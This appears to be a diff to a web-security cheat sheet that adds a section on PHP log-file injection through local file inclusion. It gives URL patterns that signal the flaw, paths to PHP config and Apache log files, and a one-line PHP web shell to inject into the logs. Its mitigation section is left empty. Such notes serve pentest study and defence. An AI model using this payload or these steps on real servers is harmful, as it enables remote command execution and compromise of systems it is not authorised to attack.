@@ -306,6 +306,52 @@ _Polyglots_: CSP Bypass using Polyglot jpeg/javascript
 **Mitigation**
 
 
+## Advanced Injection
+---  
+
+**Summary**  
+
+LFI vs LFD:
+* _Local File Inclusion_: Where you can EXECUTE files locally on the server.
+* _Local File Disclosure_: Where you can SEE the local files on the server.
+
+**Exploitation: PHP Log File Injection**  
+
+Steps:
+1. Identify LFI/LFD vulnerability signals.
+``` HTML
+domain.com/?p=somepage.txt
+domain.com/?p=pagename-whatever
+domain.com/?class=something&function=another 
+```
+
+2. Figure out where the logfiles are. Example locations:
+``` HTML
+/usr/local/etc/php
+/etc/php.d/*.ini
+/etc/php5/cli/php.ini
+/usr/local/lib/php.ini
+/etc/php.ini
+```
+
+Also check Apache logs:
+``` HTML
+/var/log/apache2/access.log
+/var/log/httpd/error_log
+/var/log/apache2/error.log
+/var/log/httpd-error.log
+```
+
+3. Inject payloads into the logfile:
+
+_PHP passthru() function_
+``` PHP
+<?php passthru($_GET['cmd']); ?>
+```
+
+**Mitigation**
+
+
 ## Server-Side Request Forgery
 ---
 
@@ -316,17 +362,6 @@ _Polyglots_: CSP Bypass using Polyglot jpeg/javascript
 
 
 **Mitigation**  
-
-
-
-## Advanced Injection
----  
-
-**Summary**  
-
-**Exploitation**  
-
-**Mitigation**
 
 
 ## Amazon Web Services and Cloud
